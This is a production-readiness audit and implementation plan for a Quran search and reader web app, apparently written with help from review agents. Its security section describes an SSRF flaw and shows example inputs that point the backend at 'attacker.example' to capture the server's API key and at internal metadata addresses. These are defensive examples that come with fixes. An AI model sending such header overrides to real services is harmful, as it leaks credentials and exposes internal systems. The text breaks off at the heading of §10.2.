# Q-Basair — Production-Readiness Review & Implementation Plan

**Date:** 2026-07-02 · **Branch reviewed:** `feat/Q-Basair-6-refonte-design` (59 commits ahead of `main`)
**Revision 2:** 2026-07-06 — re-verified against `develop` (31 new commits: identity layer, motion layer, UX fixes). **See §10 for current statuses and the re-sequenced plan; §10 supersedes the plan tables in §8.** Sections 1–9 are kept as the original record.
**Method:** four parallel deep-review agents (backend, frontend, UX/design/product, infra/CI/hygiene) + a live hands-on session against the running app (search, reader, studio, notebook, recitation, settings, themes, mobile viewport). All critical findings were independently re-verified in code.

---

## 1. Executive summary

Q-Basair is in far better shape than most pre-production apps: the strict/Tafssir contract is structurally enforced and tested, the mushaf reader is rigorous (QCF V1 glyph pages, zero-drift scroll anchoring), the design-token system landed faithfully from the handoff, the Arabic UI copy is excellent, and the nginx edge (headers, rate limits, internal-only services) is solid.

What stands between it and "production grade" falls into four buckets:

1. **Two critical security/data hazards** — an unauthenticated SSRF + server-credential-exfiltration path in the research API, and a 92–176 MB generated SQLite DB tracked in git that actively fights the deploy pipeline (`git reset --hard` reverts the production DB on every deploy; the next push of it would be hard-rejected by GitHub's 100 MB cap).
2. **Nothing between `git push` and production** — no CI test/lint gate, no rollback, a liveness-only health check, no backups of user data.
3. **Broken promise-loops in the UX** — the compact/mobile search→ayah jump is invisible, the morphology popover is a dead end, search→Studio handoff and per-form filtering from the design spec are unbuilt, and restored sessions lose their evidence.
4. **Hardening debt** — no frontend tests, unpinned Python deps, a broken `next lint` script, no observability, hot search paths that rebuild a whole-mushaf index per keystroke.

None of these are architectural rewrites. The implementation plan below sequences the work into seven phases; Phase 0 (security + data pipeline) is roughly two focused days and removes every "do not launch with this" item. Phase 5 adds the owner-requested essential feature: user identity and per-user workspaces (signup, account surface, roaming preferences, guest merge) — the data layer is already multi-user-ready, so this is mostly auth surface + UI (see §6bis).

---

## 2. What is already strong (keep it)

- **Strict-mode boundary**: finalize payloads contain no corpus chunks; locked in by `tests/test_research_agent.py`. Tafssir disclaimer is a single source of truth, persistently rendered, copper-coded.
- **Mushaf reader**: authentic per-page QCF V1 fonts with documented licensing constraints, riwayah-aware text, 5 layouts × 2 renderers, page-jump-by-typing, roving keyboard word focus, sliding 12-page window with native scroll anchoring.
- **Design system**: `tokens.css` is a value-for-value port of the handoff; gold=strict / copper=tafssir discipline held across 59 commits; theme-aware `--gold-text` passes WCAG in light mode (verified live: `#8a6a0c` on `#faf6ec` ≈ 5.4:1).
- **Search SQL**: consistently parameterized — no SQL injection found anywhere.
- **Deploy edge**: nginx security headers + per-route rate limits, healthchecks + `restart: unless-stopped` on all services, only nginx publishes ports, honest deployment doc.
- **Copy**: dignified Arabic register, instructive empty states, honest "قريباً" labels. Some of the best Arabic UI copy in the wild.
- **URL/IA hygiene**: single route with `?mode=`, legacy aliases, `router.replace` for derived state, good mobile tab bar with 94×71 touch targets and no horizontal overflow (verified live at 375px).

---

## 3. Critical findings (fix before any public exposure)

### 3.1 SSRF + server credential exfiltration — research API (CRITICAL)
`src/app/routes/research.py:24-58` accepts `X-QBasair-Ollama-Base-Url` / `-Key` / `-Chat-Model` headers from any caller and passes them to `build_runtime_settings`. At `src/app/services/research_agent_service.py:834`, when the caller supplies a base URL **without** a key, `api_key` falls back to the **server's** `OLLAMA_API_KEY`, and `_post_json`/`_get_json` send `Authorization: Bearer <server key>` to the caller-chosen URL.

- Any caller can point the backend at internal targets (`http://169.254.169.254/…`, `http://api:8001/…`) — plain `http://` URLs bypass the key requirement entirely.
- `X-QBasair-Ollama-Base-Url: https://attacker.example` → attacker receives the server's key.
- Upstream error bodies are reflected verbatim into the 503 `detail` (response-body disclosure).
- `docker-compose.yml` defaults `QBASAIR_AUTH_ENABLED=0`, so this is reachable unauthenticated.

**Fix (small):** never fall back to the env key when `base_url` is overridden; allowlist override URLs (or gate overrides behind auth/an env flag); truncate upstream error bodies (`detail[:200]`).

### 3.2 Tracked `data/quran.db` sabotages deploys and will break pushes (CRITICAL)
- Tracked on `origin/main` at 96,960,512 bytes; local working copy is now **184,741,888 bytes** and shows as `M data/quran.db`. Any future commit+push of it is **rejected by GitHub (>100 MB hard cap)** — which also blocks the push→deploy pipeline.
- `.github/workflows/deploy.yml:17` runs `git reset --hard origin/main` on the server while `docker-compose.yml:26` bind-mounts `./data:/app/data`: every deploy **reverts the production quran.db** to the stale committed blob — silently dropping tables added by `[rebuild-db]` runs, while containers hold the SQLite file open.
- `.gitignore:7` already lists it, but gitignore doesn't apply to tracked files (committed before the ignore existed). History carries ~430 MB of dead DB blobs (`.git` = 377 MB).

**Fix:** `git rm --cached data/quran.db` (+ coordinated `git rm --cached` on the server checkout), rely on `[rebuild-db]`/`QBASAIR_BUILD_DB_ON_START` to materialize it; then (separately) `git filter-repo` to purge history and shrink clones by ~10×.

### 3.3 No CI gate — every push to `main` deploys untested code (CRITICAL)
`.github/workflows/` contains only `deploy.yml`. The 12-file pytest suite and the web build run nowhere automatically. **Fix:** a minimal `ci.yml` (pytest + `next build`) required before deploy.

### 3.4 Forgeable sessions by default (HIGH)
`QBASAIR_SESSION_SECRET` falls back to a hard-coded dev value in both `src/app/core/config.py:149-150` and `docker-compose.yml:22`. If the env var is ever dropped, production cookies are signed with a public key (auth bypass). **Fix:** `${QBASAIR_SESSION_SECRET:?}` in compose + refuse startup with the default secret when `QBASAIR_AUTH_ENABLED=1`.

### 3.5 `[rebuild-db]`/`[rebuild-index]` run against the stale image (HIGH)
`deploy.yml` executes `docker compose run --rm api python scripts/build_db.py` **before** `up -d --build` — so a commit that changes the build script rebuilds the DB with the *previous* deploy's copy of the script. **Fix:** build images first, then run rebuild steps.

### 3.6 No backups of user data (HIGH)
`data/app_data.db` (notebooks, sessions, roots), `auth.db`, `research_agent.db` have no backup automation at all. One disk failure loses all user data. **Fix:** nightly `sqlite3 .backup` cron + off-host copy (Hetzner snapshot or rclone).

---

## 4. Backend findings

### Bugs
| Sev | Finding | Where |
|---|---|---|
| HIGH | `QBASAIR_DB_PATH` is documented and set in compose but **ignored** — `get_db_path()` never reads it (works in Docker only by coincidence) | `src/app/core/config.py:43-44` |
| HIGH | `get_mushaf_phrase_metadata` claims to be cached but isn't: every multi-token exact search and every phrase-suggestion keystroke re-scans **all ~77k mushaf tokens** + per-token SQL; and exact search runs the full phrase scan **twice** per request | `quran_service.py:1254`, `2458` + `2362` |
| MED | Shared caches and lazy `get_db()` init have no locking under uvicorn's threadpool → occasional `KeyError`/`RuntimeError` 500s under concurrency | `quran_service.py:28-48, 73-84` |
| MED | Malformed LLM JSON in expand/plan stages → unhandled 502 that breaks the chat, even though deterministic fallbacks already exist for the finalize stages | `research_agent_service.py:881-895, 1644-1645` |
| MED | `filter_ayahs_by_review` returns `filtered or ayahs` — when keep/discard cancel out, LLM-**discarded** ayahs are displayed, breaking ayah/answer sync | `research_agent_service.py:1616-1623` |
| LOW | Multi-root distribution labeled with an arbitrary root's text; `LIKE` patterns unescaped (`%` input matches everything); non-numeric Ollama usage values → misleading 422; `execute_searches` silently drops remaining planned searches after `max_results` | various, see agent log |

### Performance
- `/api/research-agent/settings` synchronously scrapes ollama.com then issues **one HTTP GET per model slug** in the request thread — minutes on first call; failures aren't cached (MED-HIGH).
- All routes are sync `def` on a ~40-thread pool; one research chat holds a thread through up to 5 sequential LLM round-trips (120 s timeout each) — a handful of concurrent chats starves every other endpoint (MED).
- Single shared SQLite connection serializes all queries; DB is opened read-only, so per-thread connections are safe and easy (MED).
- Embedding retrieval parses up to 5,000 JSON blobs + pure-Python cosine per research request (MED).
- **Low-memory mode inverts its goal**: Latin/word indexes skip caching entirely, so the constrained deployment rebuilds a full-mushaf index per suggestion keystroke (MED).
- Unbounded did-you-mean caches keyed on user queries → slow memory growth from crafted traffic (MED).

### Robustness
- `/api/health` never touches the DB: with `quran.db` missing, deploys pass while every search 500s. Add a DB `SELECT 1` (+ version/commit info).
- Missing rate limiting at app level on LLM endpoints and login (nginx covers some routes; scrypt login is a CPU-exhaustion surface).
- Timing-based email enumeration in login (hash a dummy password on miss).
- Empty-but-schema'd DB passes the startup check silently.

### Contract drift
- `docs/api-contract.md` omits 7+ shipping endpoints (`/api/surahs`, `/api/reciters`, `/api/root-distribution`, notebook/sessions/roots/preferences surfaces) and newer request fields (`answer_language`, `tafssir_depth`, `max_results`, `status: no_results`).
- `SuggestionItem.type` `"phrase"` is a dead discriminator (phrases are emitted as `"word"`); `root_id` never populated; `label` silently dropped.
- Tafssir prompts send corpus `source_path` to the LLM and rely on an instruction not to expose it — AGENTS.md says paths must not leak; just don't send them.

### Test gaps (backend)
Real Ollama provider HTTP layer entirely untested (all tests use a stub); no tests for the override headers (would have caught 3.1), expand/plan-stage JSON failures, concurrency races, `execute_searches` early-exit, or `start_api.py` rebuild modes.

---

## 5. Frontend findings

Codebase size ≈14,800 lines TS/TSX/CSS. Component sizes are healthy (largest TSX is 366 lines); complexity concentrates in one legacy hook (`use-search-workspace.ts`, 1,133 lines, ~200 dead) and the CSS files. The reading engine (`use-reader-window`, `use-glyph-fit-*`) is intricate but exceptionally well-commented — no defects found in it.

### Contract bug (cross-links with §3.1)
**[HIGH] Client research-settings defaults silently override the server's LLM config on every request.** `apps/web/features/research/lib/research-client-settings.ts:12-17` defaults `baseUrl: "https://ollama.com"` and hardcoded cloud models, and `buildResearchHeaders` sends any non-empty value — so **every** `/research-agent` call carries `X-QBasair-Ollama-Base-Url: https://ollama.com`, even for users who never opened settings; an intentionally emptied field reverts to the default on reload. This contradicts AGENTS.md ("defaults to Ollama through the local daemon") and means the server key is exported to the cloud URL by default via the §3.1 fallback. Fix: default all fields to `""`; send headers only for explicitly-set values.

### Bugs
| Sev | Finding | Where |
|---|---|---|
| HIGH | `runSearch` has no request-sequencing guard — rapid mode-toggle or riwayah switch can commit a **stale response** with mismatched context (suggestions and Yamli already have guards; search doesn't) | `use-search-workspace.ts:701-782` |
| HIGH | Two competing `router.replace` writers race after a search — CommandBar's effect rebuilds params from a stale snapshot and can **wipe `?q=&sm=`** from the shareable URL | `command-bar.tsx:34-40`, `use-search-workspace.ts:320-327`, `mode-context.tsx:42-61` |
| MED | Theme hydration mismatch when a light theme is stored (SSR renders dark BrandMark, client renders light) | `use-search-workspace.ts:94-101`, `left-rail.tsx:40-51` |
| MED | `rootFollowed` is panel-scoped, never reset per root nor seeded from the server — root B shows as followed after following root A | `concordance-panel.tsx:31` |
| MED | Render-phase `setState` + sessionStorage read during hydration in studio sessions; `setActiveId` called inside `setSessions` updaters | `use-studio-sessions.ts:123-127, 139-151, 256-266` |
| LOW | Un-cleared timeouts (collapse timer, suggestion blur timer); YamliInit leaks input listeners; `bookmarkFilled`/`pinFilled` icons are not actually filled (saved state signalled by color only) | various |

### UX (beyond §6)
- **[HIGH] Studio thread never scrolls to new messages** — after asking, the answer (and even the pending indicator) renders below the fold (`studio-panel.tsx`, `studio.css:140-148`).
- **[MED] Research defaults in Settings do nothing**: `createSession()` hardcodes `mode: "strict", depth: "balanced"`; nothing reads `preferences.research` — choosing تفسيرية as default still creates strict sessions (`use-studio-sessions.ts:59-68`).
- **[MED] Reciter choice never persists** — the `reciter` account preference is written/read by nothing; selection resets to Alafasy on every load (`recitation-context.tsx:65`).
- **[MED] Raw English API errors render in the Arabic UI** (`api-client:113` → `concordance-panel.tsx:107-125`).
- **[LOW]** Did-you-mean always re-searches in `exact` mode even after a failed root search; a network failure during search **wipes the reader state**; heatmap has no back affordance.

### Accessibility
- **[HIGH] No dialog has focus management** — ExportModal / ReciterSheet / ShortcutsModal: no `aria-modal`, no focus trap, no restore; ExportModal doesn't even close on Escape.
- **[MED]** `SelectMenu` listbox lacks `aria-activedescendant` (the CommandBar combobox does it right — copy that pattern); nested real button inside a `role="button"` verse row; seek slider missing `aria-valuetext`/Home/End with inverted arrow semantics in RTL.
- **[LOW]** `aria-pressed` misused for selection state; dark-theme scrollbar/slider constants lack `.light` overrides.
- **Good**: reduced-motion neutralizer, roving word nav, sr-only live search status, coarse-pointer touch bumps.

### Performance
- **[HIGH] `WorkspaceProvider` passes a fresh unmemoized object to context every render** — every keystroke (plus a 120 ms focus poll) re-renders the whole workspace: glyph pages, panels, settings, home (`workspace-context.tsx:20-23`). Split contexts or memoize slices; `React.memo` the heavy leaves.
- **[HIGH] Font-size slider fires one `PATCH /user/preferences` per pixel of drag** — dozens of in-flight requests, last-response-wins thumb jumping (`settings-screen.tsx:75-82`, `quick-settings.tsx:176-183`).
- **[MED]** Duplicate phrase-suggestion requests per keystroke (two timers); render-blocking Google Fonts `@import` (`tokens.css:23`).
- **[LOW]** `useIsMobile` starts `false` → mobile paints desktop layout for a frame; heatmap refetches the surah catalog already cached by `MushafStage`.

### Architecture & consistency
- `use-search-workspace.ts` is the god-module; ~20% dead state (workspaceView, drawer, resultPageDrafts…) left from the pre-refonte shell — purge it.
- Saved/pinned state has **three uncoordinated sources of truth** (reader `useSavedAyat`, panel `pinnedAyahIds`, library `useCompanions`) — saving in one doesn't update the others until remount.
- `ResearchSessionDetail.messages: Array<Record<string, unknown>>` forces defensive mapping and silently drops evidence on restore — define a versioned `StoredMessage` in shared.
- Dead API surface: `getResearchAgentSettings`, model-list helpers, and account prefs `riwayah`/`mushaf_font` are wired to nothing (riwayah doesn't roam across devices despite being an account pref).
- Hardcoded `rgba(212,175,55,…)` gold values repeated dozens of times across CSS instead of a `--gold-alpha-*` ramp; inline `style` props in feature components; physical LTR padding in RTL (`home.css:99`); dead selector `.qb-home-ask > svg` (the sparkle never gets its gold); Arabic plural grammar errors in `relativeAge` (`منذ 2 دقيقة` → `دقيقتين`).
- Stale docs: `AGENTS.md` documentation-first list points at two deleted files (`search-workspace-shell.tsx`, `research-pane.tsx`).

### Tests/build
- **Zero frontend tests**; no test runner anywhere in `apps/web`/`packages/*`. `next lint` is configured but ESLint isn't installed — lint never runs. Highest-value first tests: `looksLikeQuestion` (routing contract), transliteration beam search, numerals, suggestion dedupe, CommandBar keyboard flow, studio session persist/restore, one Playwright smoke (search → verse → reader sync).

---

## 6. UX / product findings (live-verified)

### Broken promise-loops (highest UX priority)
1. **Compact/mobile search→ayah dead end** — at ≤1000 px, focus mode shows the Concordance *instead of* the mushaf; tapping a verse loads it into a reader the user cannot see, with no feedback. The core search payoff is broken for every tablet/phone user (`workspace-canvas.tsx:38`).
2. **Morphology popover is a dead end** — root/lemma/pos shown with zero actions; the handoff specifies "N مواضع" (root search) and "ابدأ جلسة". The app's most magical moment is severed exactly where curiosity peaks (`morph-popover.tsx`).
3. **Search→Studio handoff + pinned context unbuilt** — no "ابدأ جلسة بحث" on verse rows, no pinned-context chips above the composer (grep `pinnedContext` = 0 hits). This is the product's differentiating loop.
4. **Restored sessions lose their evidence** — only role+content persist; the answer's ayah cards (its proof) vanish on reopen, contradicting the product promise.
5. **Per-form filter chips missing** — a root with 148 hits is a wall of cards; the handoff's screen 04 form tabs were its taming device.

### Contract-integrity flags
- **Tafssir disclaimer export hole**: `ExportModal` lets users uncheck `includeDisclaimer` (`apps/web/features/export/export-modal.tsx:25, 96-99`), so a Tafssir session exports to Markdown *without* the disclaimer. Force it on for Tafssir sessions.
- **Disclaimer copy bug (live-verified)**: `apps/web/features/studio/tafssir-disclaimer.tsx:4` reads "قراءة تفسيرية **بشرية** مُولَّدة من نموذج لغوي" — "a *human* reading generated by a language model" is self-contradictory; should be e.g. "قراءة تفسيرية **آلية**" or drop the adjective.
- Settings allows setting Tafssir as the default mode with one click, no explanation — combined with zero onboarding, a user can live in experimental mode unknowingly.

### Intent routing
`looksLikeQuestion` routes **any input ≥6 words to Studio** (`apps/web/lib/studio-prefill.ts:87`, wired at `command-bar.tsx:57`) — pasting a verse fragment to locate it (core researcher behavior) silently opens a research session. Home shows a live اسأل/ابحث indicator; the command bar shows nothing — Enter just teleports. Soften the rule (require interrogatives/؟) and add the indicator to the command bar.

### Education debt
Onboarding was deliberately deleted (`18e06bd`) and nothing inherited its job. Nothing teaches gold-vs-copper (strict vs Tafssir) — the product's ethical spine. A one-time 3-card overlay or an expandable "ما هذا؟" under the ask bar would carry it.

### Other live observations
- Recitation offers only **Hafs** reciters while the default mushaf/riwayah is **Qaloon** — audio and page text can diverge for users following along; at minimum label the mismatch.
- Segmented controls (theme, numerals, mode toggles) expose state only via a CSS class — no `aria-pressed` (live-verified). Mode toggle in Studio same issue.
- Mobile: Settings has no tab-bar entry (only the quick-settings popover); heatmap is one buried button; التلاوة unreachable except via reader footer.
- Bilingual kickers (`الدفتر · LIBRARY`, `STUDIO`) are a deliberate, consistent device — fine; keep them consistent (rail uses `feather` for Studio, tab bar uses `sparkles`).
- Google Fonts `@import` for Cairo/Reem Kufi/Amiri contradicts the self-hosted QCF posture (privacy/offline/CSP) — already flagged in `docs/technical-followups.md`, still unresolved.
- The `design/` handoff — the de-facto spec — is **untracked**; commit it.

### User-story coverage snapshot
Done: root/word search with highlights, page-faithful reader, 5 layouts, strict Q&A with evidence jumps, labeled Tafssir, notebook (verses/sessions/roots), global recitation bar, continue-reading, heatmap.
Partial: morphology (no actions), session restore (no evidence), export (MD/JSON only; PDF/DOCX "قريباً").
Missing: form filtering, pinned context/search→Studio, follow-along recitation highlighting, first-run education, memorization (ḥifẓ) mode, i18n (honest "قريباً"), **user identity & per-user workspace (signup, account menu, roaming preferences — see §6bis and Phase 5)**.

## 6bis. Per-user workspace readiness (new essential feature)

The owner wants accounts, sign-up, and per-user workspaces as a core feature (design side covered by `design/claude-design-brief-v2.md`). Current state, verified in code:

**Already in place (more than expected):**
- Every `app_data.db` table carries a `user_id` column with per-user indexes; the module docstring says the store is multi-user-ready (`src/app/services/app_data_service.py:8, 23, 41-77`).
- All companion routes resolve the authenticated user via `request.state.auth_user` and fall back to `DEFAULT_USER_ID = 0` when auth is off (`src/app/routes/companions.py:27-31`) — notebook, sessions, roots, and preferences are already per-user server-side.
- Session-cookie auth exists: `GET /api/auth/session`, `POST /api/auth/login`, `POST /api/auth/logout` (`src/app/routes/auth.py`), scrypt hashing, a Next.js middleware gate behind `NEXT_PUBLIC_AUTH_ENABLED`, and a (plain, undesigned) login page.

**Missing for the feature to ship:**
- **No self-serve signup** — no register endpoint, no email verification, no password reset/change; accounts must be provisioned out-of-band.
- **No account surface in the UI** — the rail has no account menu, no avatar, no sign-out affordance; mobile has no path to any of it.
- **Preference roaming is half-wired** — `riwayah`/`mushaf_font` account prefs are written/read by nothing (riwayah is stored device-local as `selectedMushaf`), `reciter` never persists, theme and last-read page live only in localStorage.
- **Guest→account migration** — everything a guest does lands on user 0 (server) and in localStorage (client); there is no merge path on first login.
- **Abuse hardening becomes mandatory with public signup** — login rate limiting (§4), the unbounded `ResearchSessionSave.messages` payload (storage DoS, §4), per-user quotas on LLM calls, and the Phase 0 session-secret enforcement are prerequisites, as are backups (0.6) since user data becomes real.

---

## 7. Infrastructure & repo hygiene

Beyond §3 criticals:

- **No rollback path**: images untagged, old containers replaced before the health check runs. Tag images per deploy; keep N-1.
- **Fragile health gate**: single `curl` after `sleep 15`, hardcoded domain duplicating `.env.production`. Use a retry loop + read the domain from env.
- **No log rotation** in compose (json-file default grows unbounded — disk-fill risk on a small VPS); no error tracking (Sentry), no metrics, no uptime monitoring beyond the deploy-time curl.
- **No resource limits** on any service; a runaway build can OOM the host — which also kills the deploy runner living on the same box.
- **Dockerfile.api** runs as root, unpinned `pip install`; minor Python 3.11/3.12 drift vs deploy fallback step. The web Dockerfile is a proper multi-stage build (good).
- **Tracked files that shouldn't be**: `server.err.log`, `server.out.log` (despite `*.log` ignore), `apps/web/public/fonts/AmiriQuran-Regular.ttf` (despite ignore), `GEMINI.md` (byte-identical duplicate of `CLAUDE.md`), `quran narrations/` (17 MB at root, provenance undocumented — move under `data/` or remove).
- **Untracked junk**: prototype zip, stray root `.next/` (34 MB), ~14 zero-byte log files.
- **Tooling absent**: `next lint` is a no-op (ESLint not even in the lockfile), no Prettier/tsc-check script, `requirements.txt` unpinned (3 packages), pytest/httpx undeclared, no ruff/mypy/pre-commit, no dependabot.

---

## 8. Implementation plan

Phased so each phase is independently shippable. Effort: S ≤ ½ day, M = 1–3 days, L = 1–2 weeks.

### Phase 0 — Stop-the-bleeding (security + data pipeline) — ~2 days
| # | Action | Effort |
|---|---|---|
| 0.1 | Close the SSRF/key-exfil hole: no env-key fallback with overridden `base_url`; allowlist/auth-gate override headers; truncate reflected upstream errors. Add tests for the header paths | S |
| 0.2 | `git rm --cached data/quran.db server.err.log server.out.log`; coordinated untrack on the server checkout; verify deploy no longer reverts the DB | S |
| 0.3 | Reorder `deploy.yml`: `up -d --build` **before** `[rebuild-db]`/`[rebuild-index]` steps | S |
| 0.4 | Require `QBASAIR_SESSION_SECRET` (`:?` in compose) + refuse startup on default secret with auth enabled | S |
| 0.5 | Minimal `ci.yml`: pytest + web build on every PR/push; make deploy depend on it | S |
| 0.6 | Nightly SQLite `.backup` cron for `app_data.db`/`auth.db`/`research_agent.db` + off-host copy | S |
| 0.7 | `/api/health` does `SELECT 1` on quran.db + returns commit SHA; deploy health check becomes a retry loop reading the domain from env | S |
| 0.8 | Frontend pair of 0.1: default research client settings to `""` so server config wins; send override headers only when explicitly set (`research-client-settings.ts:12-17`) | S |

### Phase 1 — Backend correctness & performance — ~3–4 days
| # | Action | Effort |
|---|---|---|
| 1.1 | Cache `get_mushaf_phrase_metadata` (house pattern exists) + thread `matches` through to kill the duplicate scan | S |
| 1.2 | Read `QBASAIR_DB_PATH` in `get_db_path()` | S |
| 1.3 | Locks around cache get/put + `get_db()` init; per-thread read-only connections | S/M |
| 1.4 | Deterministic fallbacks for expand/plan-stage JSON failures (mirror finalize behavior); fix `filter_ayahs_by_review` empty-set case | S |
| 1.5 | Cache (don't skip) indexes in low-memory mode; bound the did-you-mean caches | S |
| 1.6 | Move ollama.com catalog scrape off the request path (background refresh + cache failures) | M |
| 1.7 | Stop sending corpus `source_path`/`title` to the Tafssir LLM | S |
| 1.8 | App-level rate limiting on `/api/research-agent` and `/api/auth/login`; dummy-hash on unknown email | S/M |
| 1.9 | Pin `requirements.txt`; add `requirements-dev.txt` (pytest, httpx); non-root user in Dockerfile.api | S |
| 1.10 | Update `docs/api-contract.md` to cover all shipping endpoints/fields; fix `SuggestionItem` phrase/label/root_id drift in the same slice | M |

### Phase 1b — Frontend correctness & performance — ~3–4 days
| # | Action | Effort |
|---|---|---|
| 1b.1 | Request-sequencing guard in `runSearch` (mirror the Yamli `requestIdRef` pattern); make `reflectSearchUrl` the single URL writer | S |
| 1b.2 | Memoize/split the `WorkspaceProvider` context; `React.memo` glyph pages and panels — kills whole-app re-render per keystroke | M |
| 1b.3 | Debounce the font-size slider `PATCH` (local state + commit on release) | S |
| 1b.4 | Wire Settings research defaults into `createSession()`; persist and restore the `reciter` preference | S |
| 1b.5 | Studio thread auto-scroll on new messages + visible pending indicator | S |
| 1b.6 | Fix theme hydration mismatch (CSS-driven BrandMark); fix `rootFollowed` reset/seed per root | S |
| 1b.7 | Purge the ~200 dead lines in `use-search-workspace.ts`; dedupe phrase-suggestion timers; clear stray timeouts/listeners | S/M |
| 1b.8 | Arabic error mapping for API failures (keep technical detail in `cause`); don't wipe the reader on search failure | S |
| 1b.9 | Unify notebook state (shared context/cache for saved ayat, pins, follows across reader/panel/library) | M |
| 1b.10 | Update `AGENTS.md` file list (deleted shell files) and prune dead API-client surface (`riwayah`/`mushaf_font` prefs, unused settings endpoints) — or wire them | S/M |

### Phase 2 — UX promise-loops (the product's core value) — ~1–2 weeks
| # | Action | Effort |
|---|---|---|
| 2.1 | Compact/mobile verse tap → navigate to reading with ayah selected (or bottom-sheet mushaf preview) | S |
| 2.2 | Morphology popover actions: "N مواضع" → root search; "ابدأ جلسة عن هذا الجذر" → Studio | S |
| 2.3 | Fix disclaimer copy («بشرية» → «آلية»); force `includeDisclaimer` on for Tafssir exports; confirm-dialog when defaulting to Tafssir | S |
| 2.4 | Command-bar live intent chip (اسأل/ابحث) + soften ≥6-words rule (interrogative/؟ required) | S |
| 2.5 | Persist structured `ResearchAgentResponse` per message so restored sessions keep evidence | M |
| 2.6 | First-run education: one-time 3-card overlay teaching search / reader / gold-vs-copper | S/M |
| 2.7 | A11y pass: `aria-pressed` on segmented controls/mode toggles; focus trap + `aria-modal` + Escape on all dialogs (shared `useDialog` hook); `aria-activedescendant` in `SelectMenu`; seek-slider `aria-valuetext` | S/M |
| 2.8 | Mobile reachability: المزيد tab or overflow sheet (settings, recitation, heatmap) | S/M |
| 2.9 | Per-form filter chips in Concordance (needs form grouping endpoint) | M |
| 2.10 | Search→Studio handoff: "ابدأ جلسة بحث" on verse rows + pinned-context chips + agent prompt plumbing | M/L |

### Phase 3 — Hardening & observability — ~1 week
| # | Action | Effort |
|---|---|---|
| 3.1 | Frontend test harness (Vitest): intent routing, reader window, word nav, numerals | M |
| 3.2 | ESLint + Prettier + `tsc --noEmit` script; ruff + mypy + pre-commit for Python | M |
| 3.3 | Log rotation in compose; Sentry (or GlitchTip) on API + web; external uptime ping | M |
| 3.4 | Image tagging per deploy + documented rollback (`docker compose up` previous tag) | S/M |
| 3.5 | Self-host Cairo/Reem Kufi/Amiri; add CSP | S |
| 3.6 | Repo cleanup: delete `GEMINI.md`, gitignore zip/design or commit `design/` intentionally, move `quran narrations/` under `data/` with provenance, purge DB blobs from history (`git filter-repo`, coordinated) | M |
| 3.7 | Resource limits in compose; move runner risk note into deployment doc | S |

### Phase 4 — Product bets (choose deliberately)
| # | Action | Effort |
|---|---|---|
| 4.1 | Follow-along recitation (highlight + auto-scroll playing ayah, verse markers on seek bar) | M |
| 4.2 | Server-side PDF export with real Arabic typesetting, disclaimer baked into the template | M/L |
| 4.3 | Ḥifẓ mode (hide/reveal, per-ayah repeat, test-me) — highest-upside new bet; substrate ~70% built | L |
| 4.4 | i18n foundation (`t()` plumbing now, English strings later) | L |
| 4.5 | Qaloon/Warsh reciters or a labeled riwayah-mismatch notice in التلاوة | S/M |

### Phase 5 — User identity & per-user workspace — ~2–3 weeks
Prerequisites: 0.4 (session secret), 0.6 (backups), 1.8 (rate limiting + login timing fix). Design source: `design/claude-design-brief-v2.md` (sign-up/sign-in, calligraphic avatars, account menu, onboarding, motion). Current-state audit in §6bis.

| # | Action | Effort |
|---|---|---|
| 5.1 | Backend signup: `POST /api/auth/register` (email+password, optional invite code), password policy, email normalization; rate-limited; update `docs/api-contract.md` + `tests/test_auth.py` in the same slice | M |
| 5.2 | Password change + reset flow (token-based; email delivery can start as manual/console for the invite-only phase) | M |
| 5.3 | Bound per-user storage: cap `ResearchSessionSave.messages` size/count, notebook item counts; per-user quota on `/api/research-agent` calls | S/M |
| 5.4 | Frontend: designed sign-up/sign-in pages, account menu on the rail bottom + mobile entry, calligraphic avatar picker (per design brief) | M |
| 5.5 | Preference roaming end-to-end: wire `riwayah`, `mushaf_font`, `reciter` account prefs (currently dead), move theme/last-page to account with device-local fallback | M |
| 5.6 | Guest→account merge: on first login, migrate user-0 server data + local notebook/prefs/studio sessions into the account (explicit confirmation moment per design brief) | M |
| 5.7 | Session/device management in Settings: list active sessions, revoke others (requires moving from stateless signed cookies to a server-side session table in `auth.db`) | M |
| 5.8 | First-run onboarding for fresh accounts (3-card overlay: search, mushaf, gold-vs-copper) — absorbs item 2.6 | S/M |
| 5.9 | Flip `QBASAIR_AUTH_ENABLED=1` / `NEXT_PUBLIC_AUTH_ENABLED=1` in production; verify middleware public-path list; add account-deletion path (user data erasure) | S/M |

---

## 9. Suggested first slice

If you do only one thing this week: **Phase 0 in a single PR series** (0.1–0.8). It is all small, none of it touches product behavior, and it converts the deploy pipeline from "silently destructive" to "gated and reversible" while closing both halves of the credential-leak path (server fallback + client default headers). Phase 1.1 (+1.2) is the best second slice: one cache fixes the dominant search latency and one line fixes a config landmine. On the frontend, 1b.1–1b.3 buy the most stability per hour.

If the priority is the identity feature (Phase 5): do Phase 0 first regardless (its items are Phase 5 prerequisites), then 5.1 → 5.4 → 5.5 → 5.6 is the natural order — backend signup before UI, roaming before merge.

---

## 10. Revision 2 — status on `develop` (2026-07-06)

Re-verified finding-by-finding against `develop` HEAD `5cf8f42` (31 commits since the review snapshot `764ae37`, +6,342/−802 across 86 files) by four targeted agents. **This section supersedes §8/§9.**

### 10.1 What the 31 commits delivered

- **Phase 5 (identity & per-user workspace) is essentially shipped end-to-end**: signup endpoint + tabbed auth UI, landing page with guest access, calligraphic medallion avatars, 3-card onboarding that teaches gold-vs-copper (`welcome-flow.tsx`), account menu with name editing and sign-out, device registry with revoke (revocation genuinely invalidates tokens), guest→account merge with a 30 s undo toast, per-user preference roaming (riwayah/theme/layout/font), and Studio gating for guests on both client and server. Token crypto is sound: 256-bit `token_urlsafe`, sha256-at-rest, scrypt, owner-scoped mutations, 101 passing tests including `test_accounts.py`.
- **A disciplined motion layer**: motion tokens + keyframes, theme dawn/dusk sweep, search cascade + pulsing skeletons, ghost fly-to-notebook, page flip, evidence reveal + drawn evidence thread, long-jump travel sweep. Verified transform/opacity-only on glyph pages, reduced-motion covered in both CSS and JS, correct cleanup. This is the design brief's Mission 1, well executed.
- **Phase 2 items done**: morphology popover now has actions (root search + «ابدأ جلسة») — 2.2 ✔; command-bar intent chip — 2.4 partial (chip yes, ≥6-words rule unchanged); onboarding — 2.6 ✔ for accounts; mobile «المزيد» sheet with settings/account — 2.8 ✔; notebook state unified via `lib/notebook-sync.ts` event bus — 1b.9 ✔.
- **Error sanitization started** (`lib/error-report.ts` + `docs/error-reporting.md`): right pipeline, honest design — but wired only into the reader; Studio and Concordance still render raw `API request failed: 500…` strings.

### 10.2 What did NOT move

